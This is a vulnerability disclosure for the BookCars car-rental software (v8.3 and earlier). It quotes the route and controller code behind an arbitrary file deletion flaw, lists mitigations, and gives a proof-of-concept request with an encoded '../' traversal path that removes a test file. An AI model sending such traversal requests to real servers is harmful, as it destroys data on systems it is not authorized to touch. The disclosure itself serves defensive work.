# Unrestricted File Remove Vulnerability in BookCars

> **Software and Affected Version:** [BookCars](https://github.com/aelassas/bookcars) ≤ v8.3

## Vulnerability Files

-   `/backend/src/routes/supplierRoutes.ts`
-   `/backend/src/controllers/supplierController.ts`

## Description

An unrestricted file removal vulnerability exists in [BookCars](https://github.com/aelassas/bookcars) ≤ v8.3 at the `/api/delete-temp-contract/{file}` endpoint, where the `file` path parameter is concatenated into the target filesystem path without proper validation or canonicalization. As a result, authenticated attackers can delete arbitrary files from the server filesystem by injecting directory traversal sequences. Mitigations include canonicalizing and verifying that resolved paths are inside the intended temporary directory, rejecting directory-traversal patterns (e.g., `..`) or absolute-path inputs, validating filenames against a strict allowlist pattern, implementing proper access controls to restrict file operations to authorized resources only, and running the service with least privilege to limit the impact of potential exploitation.

## Code Analysis

In `/backend/src/routes/supplierRoutes.ts`:

```ts
routes.route(routeNames.deleteTempContract).post(authJwt.verifyToken, supplierController.deleteTempContract);
// routeNames.deleteTempContract: '/api/delete-temp-contract/:file'
```

In `/backend/src/controllers/supplierController.ts`:

```ts
/**
 * Delete a temp contract.
 *
 * @export
 * @async
 * @param {Request} req
 * @param {Response} res
 * @returns {*}
 */
export const deleteTempContract = async (req: Request, res: Response) => {
    const { file } = req.params;

    try {
        if (!file.includes('.')) {
            throw new Error('Filename not valid');
        }
        const contractFile = path.join(env.CDN_TEMP_CONTRACTS, file);
        if (await helper.pathExists(contractFile)) {
            await asyncFs.unlink(contractFile);
        }

        res.sendStatus(200);
    } catch (err) {
        logger.error(`[supplier.deleteTempContract] ${i18n.t('DB_ERROR')} ${file}`, err);
        res.status(400).send(i18n.t('ERROR') + err);
    }
};
```

The request parameter `file` does not check for path traversal patterns such as `../` or encoded variants.

## Proof of Concept

Remove test file `/test/delete-temp-contract/test-delete-temp-contract` using the following request:

```plain
/api/delete-temp-contract/%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftest%2Fdelete-temp-contract%2Ftest-delete-temp-contract
```

![](./assets/rem-1.png)

The file was successfully removed:

![](./assets/rem-2.png)
